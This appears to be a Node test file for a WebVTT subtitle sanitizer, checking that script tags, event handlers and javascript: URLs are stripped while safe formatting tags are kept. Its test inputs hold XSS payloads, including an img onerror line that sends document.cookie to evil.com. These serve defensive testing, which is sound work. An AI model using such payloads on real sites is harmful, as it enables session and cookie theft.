import { describe, it } from "node:test"
import assert from "node:assert/strict"
import { sanitizeCueText, parseVtt } from "../vtt"

describe("VTT / Subtitle Security & Sanitization", () => {
  it("strips script tags and executable contents", () => {
    const input = '<script>alert("XSS")</script>Hello World'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "Hello World")
    assert.strictEqual(sanitized.includes("<script>"), false)
  })

  it("strips img onerror and event handlers", () => {
    const input = '<img src="x" onerror="fetch(\'https://evil.com/?c=\'+document.cookie)">Watch this!'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "Watch this!")
    assert.strictEqual(sanitized.includes("onerror"), false)
    assert.strictEqual(sanitized.includes("<img"), false)
  })

  it("strips event handlers inside allowed tags", () => {
    const input = '<b onclick="alert(1)" onmouseover="alert(2)">Bold Text</b>'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "<b>Bold Text</b>")
    assert.strictEqual(sanitized.includes("onclick"), false)
    assert.strictEqual(sanitized.includes("onmouseover"), false)
  })

  it("strips javascript href and link tags", () => {
    const input = '<a href="javascript:alert(1)">Click me</a>'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "Click me")
  })

  it("strips iframe, embed, object, svg tags", () => {
    const input = '<iframe src="https://evil.com"></iframe><svg onload="alert(1)"></svg>Clean text'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "Clean text")
  })

  it("preserves legitimate subtitle formatting tags (b, i, u, s, em, strong)", () => {
    const input = "<i>Italic</i> <b>Bold</b> <u>Underline</u> <s>Strike</s> <strong>Strong</strong> <em>Em</em>"
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "<i>Italic</i> <b>Bold</b> <u>Underline</u> <s>Strike</s> <strong>Strong</strong> <em>Em</em>")
  })

  it("preserves safe font color and span style/class attributes", () => {
    const input = '<font color="#ff0000">Red text</font> and <span style="color: #00ff00">Green</span> <span class="speaker">Narrator</span>'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, '<font color="#ff0000">Red text</font> and <span style="color: #00ff00">Green</span> <span class="speaker">Narrator</span>')
  })

  it("strips malicious CSS expressions or javascript URLs in font/span attributes", () => {
    const maliciousFont = '<font color="javascript:alert(1)">Text</font>'
    assert.strictEqual(sanitizeCueText(maliciousFont), "<font>Text</font>")

    const maliciousSpan = '<span style="background: url(javascript:alert(1)); color: red">Styled</span>'
    assert.strictEqual(sanitizeCueText(maliciousSpan), "<span>Styled</span>")
  })

  it("auto-closes open tags safely", () => {
    const input = "<b>Bold without close"
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "<b>Bold without close</b>")
  })

  it("parses WebVTT file with XSS payloads safely", () => {
    const vtt = `WEBVTT

00:00:01.000 --> 00:00:04.000
<script>alert('XSS')</script><b>Hello</b> <img src=x onerror=alert(1)>world!`

    const cues = parseVtt(vtt)
    assert.strictEqual(cues.length, 1)
    assert.strictEqual(cues[0].text, "<b>Hello</b> world!")
  })
})
